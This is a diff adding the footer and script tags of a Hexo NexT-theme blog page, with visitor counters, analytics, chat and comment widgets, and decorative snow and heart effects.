+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demons</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">34k</span>
+</div>
+  <div class="addthis_inline_share_toolbox">
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5f2e451b7cef91a2" async="async"></script>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+  <script>
+  if (CONFIG.page.isPost) {
+    wpac_init = window.wpac_init || [];
+    wpac_init.push({
+      widget: 'Rating',
+      id    : 26642,
+      el    : 'wpac-rating',
+      color : 'fc6423'
+    });
+    (function() {
+      if ('WIDGETPACK_LOADED' in window) return;
+      WIDGETPACK_LOADED = true;
+      var mc = document.createElement('script');
+      mc.type = 'text/javascript';
+      mc.async = true;
+      mc.src = '//embed.widgetpack.com/widget.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+    })();
+  }
+  </script>
+
+
+
+
+
+  <script src="//code.tidio.co/8usoipuhv0iwfwugvjfoezyyxejjs12b.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
+  <script>
+      window.addEventListener('load', () => {
+      quicklink({
+        timeout : 3000,
+        priority: true,
+        ignores : [uri => uri.includes('#'),uri => uri === 'https://www.zhubokai.com/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html',]
+      });
+      });
+  </script>
+
+   
+
+ 
+<script>
+  var OriginTitile = document.title;
+  var titleTime;
+  document.addEventListener("visibilitychange", function() {
+    if (document.hidden) {
+      document.title = "(つェ⊂)我藏好了哦~" + OriginTitile;
+      clearTimeout(titleTime);
+    } else {
+      document.title = "(*´∇｀*) 被你发现啦~" + OriginTitile;
+      titleTime = setTimeout(function() {
+        document.title = OriginTitile;
+      }, 2000);
+    }
+  });
+</script>
+
+
+ 
+<script async src="//code.tidio.co/8usoipuhv0iwfwugvjfoezyyxejjs12b.js"></script>
+
+
+ 
+<script>
+  (function(h,o,t,j,a,r){
+    h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
+    h._hjSettings={hjid:1934467,hjsv:6};
+    a=o.getElementsByTagName('head')[0];
+    r=o.createElement('script');r.async=1;
+    r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
+    a.appendChild(r);
+  })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
+</script>
+
+
+
+
+  <script src="/js/wobblewindow.js"></script>
+  <script>
+    //只在桌面版网页启用特效
+    if( window.innerWidth > 768  ){
+      $(document).ready(function () {
+        
+
+        
+
+        
+      });
+    }
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'uKBH8r2O8Fr42ap3axemmi2O-gzGzoHsz',
+      appKey     : 'cku5uA0Yym3EWfUIGhrI7Xrb',
+      placeholder: "Just go go",
+      avatar     : 'monsterid',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+
+<!--动态线条背景-->
+<script type="text/javascript" color="220,220,220" opacity="0.7" zindex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
